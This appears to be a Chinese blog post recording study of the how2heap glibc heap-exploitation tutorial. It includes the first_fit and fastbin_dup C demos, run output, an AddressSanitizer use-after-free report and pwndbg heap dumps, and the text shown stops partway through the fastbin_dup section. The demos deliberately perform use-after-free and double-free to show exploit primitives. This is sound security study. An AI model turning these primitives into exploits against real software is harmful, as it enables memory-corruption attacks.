<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x01 环境how2heap 是由 shellphish 团队制作的堆利用教程，介绍了多种堆利用技术。使用 Ubuntu 16.04 64位系统环境，glibc 版本如下： $ file &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so: ELF 64-bit LSB shared object, x86-">
<meta property="og:type" content="article">
<meta property="og:title" content="How2heap 学习记录">
<meta property="og:url" content="http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="1nv0k3r&#39;s blog">
<meta property="og:description" content="0x01 环境how2heap 是由 shellphish 团队制作的堆利用教程，介绍了多种堆利用技术。使用 Ubuntu 16.04 64位系统环境，glibc 版本如下： $ file &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so: ELF 64-bit LSB shared object, x86-">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.jpg">
<meta property="article:published_time" content="2019-02-26T02:34:42.000Z">
<meta property="article:modified_time" content="2021-04-13T16:20:11.788Z">
<meta property="article:author" content="1nv0k3r">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>How2heap 学习记录</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/02/26/%E8%B0%83%E7%94%A8malloc%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/02/25/2019%E5%B9%B42%E6%9C%88%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&text=How2heap 学习记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&is_video=false&description=How2heap 学习记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=How2heap 学习记录&body=Check out this article: http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&name=How2heap 学习记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-堆分配机制-amp-malloc-amp-free"><span class="toc-number">2.</span> <span class="toc-text">0x02 堆分配机制 &amp; malloc &amp; free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-malloc-size-t-n"><span class="toc-number">2.1.</span> <span class="toc-text">malloc: malloc(size_t n)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-free-void-p"><span class="toc-number">2.2.</span> <span class="toc-text">free: free(void* p)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwndbg的几个操作指令"><span class="toc-number">3.</span> <span class="toc-text">0x03 pwndbg的几个操作指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-first-fit"><span class="toc-number">4.</span> <span class="toc-text">0x04 first_fit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-fastbin-dup"><span class="toc-number">5.</span> <span class="toc-text">0x05 fastbin_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-fastbin-dup-into-stack"><span class="toc-number">6.</span> <span class="toc-text">0x06 fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-fastbin-dup-consolidate"><span class="toc-number">7.</span> <span class="toc-text">0x07 fastbin_dup_consolidate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-unsafe-unlink"><span class="toc-number">8.</span> <span class="toc-text">0x08 unsafe_unlink</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        How2heap 学习记录
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">1nv0k3r's blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-02-26T02:34:42.000Z" itemprop="datePublished">2019-02-26</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>how2heap 是由 shellphish 团队制作的堆利用教程，介绍了多种堆利用技术。使用 Ubuntu 16.04 64位系统环境，glibc 版本如下：</p>
<pre><code>$ file /lib/x86_64-linux-gnu/libc-2.23.so
/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped
</code></pre><p>从github clone文件夹下来</p>
<pre><code>$ git clone https://github.com/shellphish/how2heap.git
$ cd how2heap
$ make
</code></pre><p>还有几个实例程序, from <a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.6_heap_exploit_1.html">CTF-ALL-IN-ONE</a></p>
<h2 id="0x02-堆分配机制-amp-malloc-amp-free"><a href="#0x02-堆分配机制-amp-malloc-amp-free" class="headerlink" title="0x02 堆分配机制 &amp; malloc &amp; free"></a>0x02 堆分配机制 &amp; malloc &amp; free</h2><p>在用malloc分配内存时, 程序向堆管理器发起请求</p>
<p>为了保持内存管理高效, 内核会预先分配一块内存给堆管理器, 堆空间不足时, 堆管理器向操作系统进行交互</p>
<h3 id="malloc-malloc-size-t-n"><a href="#malloc-malloc-size-t-n" class="headerlink" title="malloc: malloc(size_t n)"></a>malloc: <code>malloc(size_t n)</code></h3><ul>
<li>当<code>n=0</code>时, 返回操作系统允许的最小内存块</li>
<li>当<code>n&lt;0</code>时, 由于size_t是无符号整型, 因此会分配一个很大的内存(通常失败, 因为没有这么大内存)</li>
<li>正常情况下返回指定大小的内存的指针</li>
</ul>
<p>malloc本身是一个用户函数, 并没有真正和系统进行交互, 而是通过调用brk和sbrk以及mmap, munmap函数来操作</p>
<p><img src="/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.jpg" alt="img"></p>
<p>图片来自<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview/#_4">ctfwiki</a></p>
<p>限于篇幅, 调用malloc后系统的操作将在另一篇文章里说明</p>
<h3 id="free-free-void-p"><a href="#free-free-void-p" class="headerlink" title="free: free(void* p)"></a>free: <code>free(void* p)</code></h3><ul>
<li>p=null时, free不做任何操作</li>
<li>p指向的内存如果被释放, 会造成各种影响 (glibc的原文说明:It can have arbitrary (i.e., bad!)effects if p has already been freed.)</li>
<li>除了在用mallopt限制了一些内存操作的情况下,当free很大的内存时, 会将这些内存直接返还给系统, 而不是交给堆管理器 </li>
</ul>
<h2 id="0x03-pwndbg的几个操作指令"><a href="#0x03-pwndbg的几个操作指令" class="headerlink" title="0x03 pwndbg的几个操作指令"></a>0x03 pwndbg的几个操作指令</h2><p>用了一圈peda, gef, 还是pwndbg好用</p>
<pre><code>r(un) 重新开始运行程序
c(ontinue) 到断点后继续执行
n(ext) 单步步过调试
s(tep) 单步步入调试
until 运行至循环结束
until addr 运行至某一指令
finish 运行至当前函数完成返回
call 调试某个函数
q(uit) 退出

b(reak) addr 在指定位置设置断点
delete 断点号 删除断点
disable 断点号 暂停断点
enable 断点号 恢复断点
clear addr 删除指定位置的断点
info b(reakpoints) 查看断点信息
delete b(reakpoints) 删除所有断点

where/bt  当前运行的堆栈列表；
bt backtrace 显示当前调用堆栈
up/down 改变堆栈显示的深度
set args 参数:指定运行时的参数
show args：查看设置好的参数

arena 查看arena
mp 查看mmap
bins,fastbins,unsorted,smallbins,largebins 各种bins
heap 查看堆
top_chunk
rop --grep &quot;pop rdi&quot; ROP搜索
vmmap 虚拟内存映射
</code></pre><h2 id="0x04-first-fit"><a href="#0x04-first-fit" class="headerlink" title="0x04 first_fit"></a>0x04 first_fit</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">	<span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个程序展示了glibc的堆分配算法, 即first fit首次适应算法</p>
<pre><code>➜  how2heap git:(master) ✗ ./first_fit 
This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s allocator.
glibc uses a first-fit algorithm to select a free chunk.
If a chunk is free and large enough, malloc will select this chunk.
This can be exploited in a use-after-free situation.
Allocating 2 buffers. They can be large, don&#39;t have to be fastbin.
1st malloc(512): 0x21f1010
2nd malloc(256): 0x21f1220
we could continue mallocing here...
now let&#39;s put a string at a that we can read later &quot;this is A!&quot;
first allocation 0x21f1010 points to this is A!
Freeing the first one...
We don&#39;t need to free anything again. As long as we allocate less than 512, it will end up at 0x21f1010
So, let&#39;s allocate 500 bytes
3rd malloc(500): 0x21f1010
And put a different string here, &quot;this is C!&quot;
3rd allocation 0x21f1010 points to this is C!
first allocation 0x21f1010 points to this is C!
If we reuse the first allocation, it now holds the data from the third allocation.
</code></pre><p>程序先malloc了一个512byte的chunk, 之后malloc了一个256byte的chunk</p>
<p>然后向这两个chunk写入数据</p>
<p>再free第一个512byte的chunk</p>
<p>之后malloc一个500byte的chunk, 会优先分配之前free掉的chunk, 这个free掉的chunk保存在bins中</p>
<p>所以为什么叫bins, 即存放free后的chunk的一个盒子</p>
<p>现在加上内存检测参数重新编译</p>
<pre><code>➜  how2heap git:(master) ✗ gcc -fsanitize=address -g first_fit.c
➜  how2heap git:(master) ✗ ./a.out                              
This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s allocator.
glibc uses a first-fit algorithm to select a free chunk.
If a chunk is free and large enough, malloc will select this chunk.
This can be exploited in a use-after-free situation.
Allocating 2 buffers. They can be large, don&#39;t have to be fastbin.
1st malloc(512): 0x61500000fd00
2nd malloc(256): 0x611000009f00
we could continue mallocing here...
now let&#39;s put a string at a that we can read later &quot;this is A!&quot;
first allocation 0x61500000fd00 points to this is A!
Freeing the first one...
We don&#39;t need to free anything again. As long as we allocate less than 512, it will end up at 0x61500000fd00
So, let&#39;s allocate 500 bytes
3rd malloc(500): 0x61500000fa80
And put a different string here, &quot;this is C!&quot;
3rd allocation 0x61500000fa80 points to this is C!
=================================================================
==14332==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500000fd00 at pc 0x7f7c483d21e9 bp 0x7ffd40c779f0 sp 0x7ffd40c77168
READ of size 2 at 0x61500000fd00 thread T0
    #0 0x7f7c483d21e8  (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x601e8)
    #1 0x7f7c483d2bcc in vfprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60bcc)
    #2 0x7f7c483d2cf9 in fprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60cf9)
    #3 0x400df4 in main /home/a/how2heap/first_fit.c:35
    #4 0x7f7c47fc882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #5 0x400878 in _start (/home/a/how2heap/a.out+0x400878)

0x61500000fd00 is located 0 bytes inside of 512-byte region [0x61500000fd00,0x61500000ff00)
freed by thread T0 here:
    #0 0x7f7c4840a2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)
    #1 0x400c4c in main /home/a/how2heap/first_fit.c:25
    #2 0x7f7c47fc882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

previously allocated by thread T0 here:
    #0 0x7f7c4840a602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
    #1 0x400a97 in main /home/a/how2heap/first_fit.c:13
    #2 0x7f7c47fc882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

SUMMARY: AddressSanitizer: heap-use-after-free ??:0 ??
Shadow bytes around the buggy address:
0x0c2a7fff9f50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0c2a7fff9f60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0c2a7fff9f70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0c2a7fff9f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 fa
0x0c2a7fff9f90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=&gt;0x0c2a7fff9fa0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a7fff9fb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a7fff9fc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a7fff9fd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c2a7fff9fe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x0c2a7fff9ff0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07 
Heap left redzone:       fa
Heap right redzone:      fb
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack partial redzone:   f4
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
==14332==ABORTING
</code></pre><p>可以看到检测到一个uaf的漏洞</p>
<h2 id="0x05-fastbin-dup"><a href="#0x05-fastbin-dup" class="headerlink" title="0x05 fastbin_dup"></a>0x05 fastbin_dup</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序先malloc了3个8byte的chunk</p>
<pre><code>pwndbg&gt; heap
0x602000 FASTBIN {
prev_size = 0, 
size = 33, 
fd = 0x0, 
bk = 0x0, 
fd_nextsize = 0x0, 
bk_nextsize = 0x21
}
0x602020 FASTBIN {
prev_size = 0, 
size = 33, 
fd = 0x0, 
bk = 0x0, 
fd_nextsize = 0x0, 
bk_nextsize = 0x21
}
0x602040 FASTBIN {
prev_size = 0, 
size = 33, 
fd = 0x0, 
bk = 0x0, 
fd_nextsize = 0x0, 
bk_nextsize = 0x20fa1
}
0x602060 PREV_INUSE {
prev_size = 0, 
size = 135073, 
fd = 0x0, 
bk = 0x0, 
fd_nextsize = 0x0, 
bk_nextsize = 0x0
}
pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 1
0x602010:    0x0000000000000000    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 2
0x602030:    0x0000000000000000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 3
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000020fa1
</code></pre><p>之后free了第一个chunk</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 1(be freed)
0x602010:    0x0000000000000000    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 2
0x602030:    0x0000000000000000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 3
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000020fa1
</code></pre><p>如果这时候再次free第一个chunk(去掉代码内注释)的话, 会提示:</p>
<pre><code>➜  how2heap git:(master) ✗ ./fastbin_dup 
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0xa92010
2nd malloc(8): 0xa92030
3rd malloc(8): 0xa92050
Freeing the first one...
If we free 0xa92010 again, things will crash because 0xa92010 is at the top of the free list.
*** Error in `./fastbin_dup&#39;: double free or corruption (fasttop): 0x0000000000a92010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fe8490a57e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fe8490ae37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fe8490b253c]
./fastbin_dup[0x400762]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fe84904e830]
./fastbin_dup[0x400579]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1204504                            /home/a/how2heap/fastbin_dup
00600000-00601000 r--p 00000000 08:01 1204504                            /home/a/how2heap/fastbin_dup
00601000-00602000 rw-p 00001000 08:01 1204504                            /home/a/how2heap/fastbin_dup
00a92000-00ab3000 rw-p 00000000 00:00 0                                  [heap]
7fe844000000-7fe844021000 rw-p 00000000 00:00 0 
7fe844021000-7fe848000000 ---p 00000000 00:00 0 
7fe848e18000-7fe848e2e000 r-xp 00000000 08:01 661172                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fe848e2e000-7fe84902d000 ---p 00016000 08:01 661172                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fe84902d000-7fe84902e000 rw-p 00015000 08:01 661172                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fe84902e000-7fe8491ee000 r-xp 00000000 08:01 664598                     /lib/x86_64-linux-gnu/libc-2.23.so
7fe8491ee000-7fe8493ee000 ---p 001c0000 08:01 664598                     /lib/x86_64-linux-gnu/libc-2.23.so
7fe8493ee000-7fe8493f2000 r--p 001c0000 08:01 664598                     /lib/x86_64-linux-gnu/libc-2.23.so
7fe8493f2000-7fe8493f4000 rw-p 001c4000 08:01 664598                     /lib/x86_64-linux-gnu/libc-2.23.so
